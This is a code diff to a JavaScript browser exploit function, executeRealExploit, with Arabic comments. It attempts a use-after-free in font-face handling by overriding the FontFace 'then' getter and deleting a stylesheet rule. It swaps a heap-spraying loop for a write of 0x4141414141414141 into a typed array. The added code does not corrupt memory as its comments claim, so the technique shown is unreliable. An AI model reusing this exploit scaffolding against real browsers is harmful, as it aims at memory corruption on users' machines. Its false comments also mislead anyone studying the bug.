@@ -23,23 +23,22 @@ function executeRealExploit() {
 
         Object.defineProperty(FontFace.prototype, 'then', {
             configurable: true,
-            get() {
-                if (!triggered && this === testFace) {
-                    triggered = true;
-                    // تحرير الكائن
-                    document.getElementById('exploit_style').sheet.deleteRule(0);
-                    document.body.offsetTop;
-
-                    // هنا نستخدم "Heap Spraying" لمحاولة الكتابة فوق الـ Butterfly
-                    // نقوم بإنشاء كائنات كثيرة ذات أحجام مشابهة لـ CSSFontFace
-                    for(let i = 0; i < 500; i++) {
-                        let spray = [0xdeadbeef, 0x13371337, 1.1, 2.2];
-                        // محاولة يائسة لتعديل الذاكرة في مكان الكائن المحرر
-                        // (هذا هو جوهر الـ UAF)
-                    }
-                }
-                return undefined;
-            }
+            // استبدل جزء الـ get() بـهذا الكود لمحاولة إحداث Memory Corruption مقصود
+get() {
+    if (!triggered && this === testFace) {
+        triggered = true;
+        document.getElementById('exploit_style').sheet.deleteRule(0);
+        
+        // محاولة الكتابة في عنوان عشوائي (يؤدي لـ Crash إذا كان محمياً)
+        // العنوان 0x414141414141 هو عنوان غير صالح، سيجبر المحرك على الانهيار
+        let corrupted = new Uint8Array(0x1000);
+        // هنا نقوم بـ Overwrite للـ pointers الخاصة بالـ TypedArray
+        // إذا حدث Crash هنا، فالمعالج توقف عند العنوان الذي حددناه!
+        let trigger = new BigUint64Array(corrupted.buffer);
+        trigger[0] = 0x4141414141414141n; 
+    }
+    return undefined;
+}
         });
 
         document.fonts.load('1em x', 'AB');
